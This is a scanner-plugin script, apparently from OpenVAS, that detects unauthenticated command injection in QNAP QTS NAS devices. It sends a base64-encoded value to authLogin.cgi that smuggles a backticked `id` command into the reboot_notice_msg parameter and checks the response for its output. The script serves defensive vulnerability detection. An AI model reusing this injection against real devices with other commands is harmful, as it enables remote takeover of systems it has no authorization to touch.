###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_qnap_rce_20170313.nasl 5895 2017-04-07 14:44:59Z mime $
#
# QNAP QTS Multiple Arbitrary Command Execution Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/h:qnap';

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.140238");
 script_bugtraq_id(97072,97059);
 script_cve_id("CVE-2017-5227","CVE-2017-6361","CVE-2017-6360","CVE-2017-6359");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 5895 $");

 script_name("QNAP QTS Multiple Arbitrary Command Execution Vulnerabilities");

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/97059");
 script_xref(name:"URL", value:"https://sintonen.fi/advisories/qnap-qts-multiple-rce-vulnerabilities.txt");
 script_xref(name:"URL", value:"https://www.qnap.com/en/support/con_show.php?cid=113");

 script_tag(name: "vuldetect" , value:"Try to execute the `id` command by sending a special crafted HTTP GET request.");
 script_tag(name: "insight" , value:"QTS 4.2.4 Build 20170313 includes security fixes for the following vulnerabilities:

- Configuration file vulnerability (CVE-2017-5227) reported by Pasquale Fiorillo of the cyber security company, ISGroup (www.isgroup.biz), a cyber security company, and Guido Oricchio of PCego (www.pcego.com), a system integrator
- SQL injection, command injection, heap overflow, cross-site scripting, and three stack overflow vulnerabilities reported by Peter Kostiuk, a security researcher at Salesforce.com
- Three command injection vulnerabilities (CVE-2017-6361, CVE-2017-6360, and CVE-2017-6359) reported by Harry Sintonen of F-Secure
- Access control vulnerability that would incorrectly restrict authorized user access to resources
- Two stack overflow vulnerabilities that could be exploited to execute malicious codes reported by Oliver Gruskovnjak, Security Researcher (Salesforce.com)
- Clickjacking vulnerability that could be exploited to trick users into clicking malicious links
- Missing HttpOnly Flag From Cookie vulnerability that could be exploited to steal session cookies
- SNMP Agent Default Community Name vulnerability that could be exploited to gain access to the system using the default community string
- NMP credentials in clear text vulnerability that could be exploited to steal user credentials
- LDAP anonymous directory access vulnerability that could be exploited to allow anonymous connections");

 script_tag(name: "solution" , value:"Update to  QTS 4.2.4 Build 20170313 or newer.");
 script_tag(name: "summary" , value:"QNAP QTS web user interface CGI binaries include Command Injection vulnerabilities. An unauthenticated attacker can execute 
arbitrary commands on the targeted device.");
 script_tag(name:"solution_type", value: "VendorFix");

 script_tag(name:"qod_type", value:"remote_active");

 script_tag(name:"last_modification", value:"$Date: 2017-04-07 16:44:59 +0200 (Fri, 07 Apr 2017) $");
 script_tag(name:"creation_date", value:"2017-04-07 11:52:09 +0200 (Fri, 07 Apr 2017)");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
 script_dependencies("gb_qnap_nas_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_mandatory_keys("qnap/qts");

 exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port_from_cpe_prefix( cpe:CPE ) ) exit( 0 );

t = ( unixtime() % 100000000 );

rmessage = base64( str: 'QNAPVJBD' + t + '      Disconnect  14`(echo;id)>&2`' );

url = '/cgi-bin/authLogin.cgi?reboot_notice_msg=' + rmessage;

if( buf = http_vuln_check( port:port, url:url, pattern:'uid=[0-9]+.*gid=[0-9]+', check_header:TRUE ) )
{
  report = 'It was possible to execute the `id` command on the remote host.\n' +
           report_vuln_url(  port:port, url:url ) +
           '\n\nResponse:\n\n' + buf;
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
